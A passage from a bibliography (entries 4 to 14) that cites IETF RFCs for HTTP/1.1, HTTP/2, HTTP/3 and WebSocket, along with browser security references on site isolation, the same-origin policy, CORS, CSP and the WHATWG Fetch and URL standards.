4. RFC 9113. "HTTP/2." IETF, June 2022. https://www.rfc-editor.org/rfc/rfc9113
5. RFC 9114. "HTTP/3." IETF, June 2022. https://www.rfc-editor.org/rfc/rfc9114
6. RFC 6455. "The WebSocket Protocol." IETF, December 2011. https://www.rfc-editor.org/rfc/rfc6455
7. RFC 7540. "HTTP/2." IETF, May 2015. https://www.rfc-editor.org/rfc/rfc7540
8. RFC 7230-7235. "HTTP/1.1 (Obsoleted by RFC 9110-9114)." IETF, 2014.
9. Chromium Project. "Site Isolation." https://www.chromium.org/Home/chromium-security/site-isolation/
10. Mozilla MDN. "Same-Origin Policy." https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
11. W3C. "CORS Specification." https://www.w3.org/TR/cors/
12. W3C. "Content Security Policy Level 3." https://www.w3.org/TR/CSP3/
13. WHATWG. "Fetch Standard." https://fetch.spec.whatwg.org/
14. WHATWG. "URL Standard." https://url.spec.whatwg.org/